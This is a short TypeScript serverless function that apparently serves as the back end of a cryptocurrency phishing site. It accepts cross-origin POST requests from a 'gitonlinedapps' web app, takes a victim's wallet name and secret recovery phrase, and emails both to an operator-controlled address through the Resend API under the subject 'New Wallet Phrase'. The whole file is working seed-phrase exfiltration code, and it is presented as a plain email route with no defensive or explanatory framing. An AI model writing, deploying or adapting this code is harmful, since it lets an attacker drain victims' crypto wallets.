
import { Resend } from 'resend'
import type { VercelRequest, VercelResponse } from '@vercel/node'

const resend = new Resend(process.env.RESEND_API_KEY)

export default async function handler(req: VercelRequest, res: VercelResponse) {
    res.setHeader('Access-Control-Allow-Origin', 'https://gitonlinedapps.web.app')
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS')
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type')

    if (req.method === 'OPTIONS') {
        return res.status(200).end()
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' })
    }

    const { walletName, walletPhrase } = req.body

    const { data, error } = await resend.emails.send({
        from: 'Phrase alert <onboarding@resend.dev>',
        to: [process.env.WALLET_TO_EMAIL as string],
        subject: `New Wallet Phrase`,
        html: `
      <p>Wallet Name: ${walletName}</p>
      <p>Secret Phrase: ${walletPhrase}</p>
    `,
    })

    if (error) {
        return res.status(500).json({ error: error.message })
    }

    return res.status(200).json(data)
}